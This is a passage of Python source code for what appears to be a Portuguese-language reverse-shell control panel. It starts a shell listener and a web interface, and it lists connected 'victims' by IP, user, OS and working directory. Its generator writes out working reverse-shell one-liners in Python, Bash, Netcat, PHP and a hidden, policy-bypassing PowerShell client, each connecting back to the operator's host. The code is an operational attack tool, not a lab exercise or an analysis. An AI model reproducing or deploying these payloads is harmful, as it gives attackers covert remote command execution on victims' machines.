            print(f"{Fore.YELLOW}⚠️  Servidores já estão em execução!{Style.RESET_ALL}")
            time.sleep(2)
            return
        
        # Iniciar servidor shell reverso
        self.shell_thread = threading.Thread(target=self.start_shell_server, daemon=True)
        self.shell_thread.start()
        
        # Iniciar servidor web
        self.web_thread = threading.Thread(target=self.start_web_server, daemon=True)
        self.web_thread.start()
        
        print(f"{Fore.GREEN}🚀 Iniciando servidores...{Style.RESET_ALL}")
        time.sleep(2)
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}                 SERVIDORES EM EXECUÇÃO{Fore.CYAN}                     ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║{Fore.YELLOW} Web Interface: {Fore.WHITE}http://{SERVER_IP}:{WEB_PORT}{Fore.CYAN}                   ║")
        print(f"║{Fore.YELLOW} Shell Server:  {Fore.WHITE}{SERVER_IP}:{SHELL_PORT}{Fore.CYAN}                         ║")
        print(f"║{Fore.YELLOW} Senha: {Fore.WHITE}{ADMIN_PASSWORD}{Fore.CYAN}                                       ║")
        print(f"║{Fore.YELLOW} Pressione Enter para voltar ao menu{Fore.CYAN}                   ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        input()
    
    def configure_settings(self):
        global SERVER_IP, WEB_PORT, SHELL_PORT, ADMIN_PASSWORD
        
        self.clear_screen()
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}                   CONFIGURAÇÕES{Fore.CYAN}                            ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        
        print(f"║{Fore.YELLOW} IP atual: {Fore.WHITE}{SERVER_IP}{Fore.CYAN}                                      ║")
        new_ip = input(f"║{Fore.GREEN} Novo IP (Enter para manter): {Style.RESET_ALL}").strip()
        if new_ip:
            SERVER_IP = new_ip
        
        print(f"║{Fore.YELLOW} Porta Web atual: {Fore.WHITE}{WEB_PORT}{Fore.CYAN}                                 ║")
        new_port = input(f"║{Fore.GREEN} Nova Porta Web (Enter para manter): {Style.RESET_ALL}").strip()
        if new_port and new_port.isdigit():
            WEB_PORT = int(new_port)
        
        print(f"║{Fore.YELLOW} Porta Shell atual: {Fore.WHITE}{SHELL_PORT}{Fore.CYAN}                               ║")
        new_port = input(f"║{Fore.GREEN} Nova Porta Shell (Enter para manter): {Style.RESET_ALL}").strip()
        if new_port and new_port.isdigit():
            SHELL_PORT = int(new_port)
        
        print(f"║{Fore.YELLOW} Senha atual: {Fore.WHITE}{ADMIN_PASSWORD}{Fore.CYAN}                               ║")
        new_pass = input(f"║{Fore.GREEN} Nova Senha (Enter para manter): {Style.RESET_ALL}").strip()
        if new_pass:
            ADMIN_PASSWORD = new_pass
        
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝")
        print(f"{Fore.GREEN}✅ Configurações atualizadas!{Style.RESET_ALL}")
        time.sleep(2)
    
    def generate_shell_script(self):
        self.clear_screen()
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}               GERAR SCRIPT SHELL REVERSO{Fore.CYAN}                    ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        
        # Obter o IP real do servidor
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            server_ip = s.getsockname()[0]
            s.close()
        except:
            server_ip = SERVER_IP
        
        print(f"║{Fore.YELLOW} Selecione o tipo de shell:{Fore.CYAN}                                 ║")
        print(f"║{Fore.GREEN} 1.{Fore.WHITE} Python{Fore.CYAN}                                                  ║")
        print(f"║{Fore.GREEN} 2.{Fore.WHITE} Bash{Fore.CYAN}                                                    ║")
        print(f"║{Fore.GREEN} 3.{Fore.WHITE} Netcat{Fore.CYAN}                                                  ║")
        print(f"║{Fore.GREEN} 4.{Fore.WHITE} PHP{Fore.CYAN}                                                     ║")
        print(f"║{Fore.GREEN} 5.{Fore.WHITE} PowerShell{Fore.CYAN}                                              ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}➤ Selecione uma opção: {Style.RESET_ALL}").strip()
        
        shell_types = {
            '1': 'python',
            '2': 'bash', 
            '3': 'nc',
            '4': 'php',
            '5': 'powershell'
        }
        
        if choice in shell_types:
            shell_type = shell_types[choice]
            
            if shell_type == "python":
                shell_code = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'''
            elif shell_type == "bash":
                shell_code = f'bash -i >& /dev/tcp/{server_ip}/{SHELL_PORT} 0>&1'
            elif shell_type == "nc":
                shell_code = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {server_ip} {SHELL_PORT} >/tmp/f'
            elif shell_type == "php":
                shell_code = f'php -r \'$sock=fsockopen("{server_ip}",{SHELL_PORT});exec("/bin/sh -i <&3 >&3 2>&3");\''
            elif shell_type == "powershell":
                shell_code = f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{server_ip}",{SHELL_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
            
            print(f"\n{Fore.GREEN}✅ Script gerado:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{shell_code}{Style.RESET_ALL}")
            
            # Oferecer para salvar em um arquivo
            save = input(f"\n{Fore.YELLOW}➤ Deseja salvar em um arquivo? (s/N): {Style.RESET_ALL}").strip().lower()
            if save == 's':
                filename = input(f"{Fore.YELLOW}➤ Nome do arquivo: {Style.RESET_ALL}").strip()
                if filename:
                    try:
                        with open(filename, 'w') as f:
                            f.write(shell_code)
                        print(f"{Fore.GREEN}✅ Script salvo em {filename}{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{Fore.RED}❌ Erro ao salvar arquivo: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ Opção inválida!{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}➤ Pressione Enter para continuar...{Style.RESET_ALL}")
    
    def show_victims(self):
        self.clear_screen()
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.WHITE}                   VÍTIMAS CONECTADAS{Fore.CYAN}                         ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        
        if self.shell_server and self.shell_server.victims:
            for victim_id, victim in self.shell_server.victims.items():
                info = victim.get_info()
                print(f"║ {Fore.GREEN}ID: {victim_id}{Fore.CYAN}")
                print(f"║ {Fore.YELLOW}IP: {info['ip']}:{info['port']}{Fore.CYAN}")
                print(f"║ {Fore.YELLOW}Usuário: {info['username']} | OS: {info['os']}{Fore.CYAN}")
                print(f"║ {Fore.YELLOW}Uptime: {info['uptime']}{Fore.CYAN}")
                print(f"║ {Fore.YELLOW}Diretório: {info['current_dir']}{Fore.CYAN}")
                print(f"║{Fore.CYAN}                                                      ║")
        else:
            print(f"║ {Fore.RED}Nenhuma vítima conectada{Fore.CYAN}                                 ║")
        
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}➤ Pressione Enter para continuar...{Style.RESET_ALL}")
    
    def test_connection(self):
        print(f"{Fore.CYAN}🧪 Testando conexão...{Style.RESET_ALL}")
        time.sleep(1)
        
        try:
            # Testar se a porta web está disponível
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((SERVER_IP, WEB_PORT))
            sock.close()
            
            if result == 0:
                print(f"{Fore.RED}❌ Porta web {WEB_PORT} já está em uso!{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}✅ Porta web {WEB_PORT} disponível{Style.RESET_ALL}")
                
            # Testar se a porta shell está disponível
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((SERVER_IP, SHELL_PORT))
            sock.close()
            
            if result == 0:
                print(f"{Fore.RED}❌ Porta shell {SHELL_PORT} já está em uso!{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}✅ Porta shell {SHELL_PORT} disponível{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}❌ Erro no teste: {e}{Style.RESET_ALL}")
        
        time.sleep(2)
    
    def clean_exit(self):
        print(f"{Fore.YELLOW}🔄 Encerrando...{Style.RESET_ALL}")
        if self.server:
            self.server.shutdown()
        if self.shell_server:
            self.shell_server.stop()
        time.sleep(1)

def main():
    try:
        panel = TerminalPanel()
        panel.show_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Encerrado pelo usuário{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}💥 Erro crítico: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
